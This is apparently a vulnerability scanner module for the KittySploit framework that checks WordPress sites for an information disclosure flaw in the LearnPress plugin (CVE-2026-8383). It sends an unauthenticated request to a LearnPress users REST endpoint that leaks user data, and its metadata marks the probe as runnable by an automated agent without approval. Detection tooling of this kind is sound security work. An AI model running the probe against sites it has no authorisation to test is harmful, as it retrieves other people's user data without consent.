#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LearnPress WordPress plugin < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LearnPress < 4.3.7 - Information Disclosure Detection',
        'description': 'LearnPress WordPress plugin < 4.3.7 contains an information disclosure vulnerability caused by missing capability checks on a REST endpoint, letting unauthenticated visitors retrieve sensitive user role and capability data via crafted requests.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/b7cbf68b-62c5-4787-b84b-69df9e0122b2/',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-8383',
        ],
        'cve': 'CVE-2026-8383',
    }

    def run(self):
        path = '/wp-json/learnpress/v1/users?context=edit'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('registered_date',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='LearnPress < 4.3.7 - Information Disclosure detected', path=path)
            return True
        return False

